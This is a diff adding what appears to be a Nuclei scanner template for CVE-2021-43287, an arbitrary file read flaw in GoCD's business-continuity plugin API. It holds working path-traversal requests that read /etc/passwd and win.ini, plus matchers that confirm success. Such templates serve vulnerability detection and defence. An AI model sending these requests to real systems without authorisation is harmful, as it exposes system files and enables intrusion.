@@ -1,0 +1,28 @@
+id: gocd-pluginname-fileread
+info:
+  name: GoCD Business Continuity Arbitrary File Read Vulnerability (CVE-2021-43287)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,cve,cve-2021-43287
+http:
+  - raw:
+      - |
+        GET /go/add-on/business-continuity/api/plugin?folderName&pluginName=../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /go/add-on/business-continuity/api/plugin?folderName&pluginName=../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
+        condition: and
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+        part: body
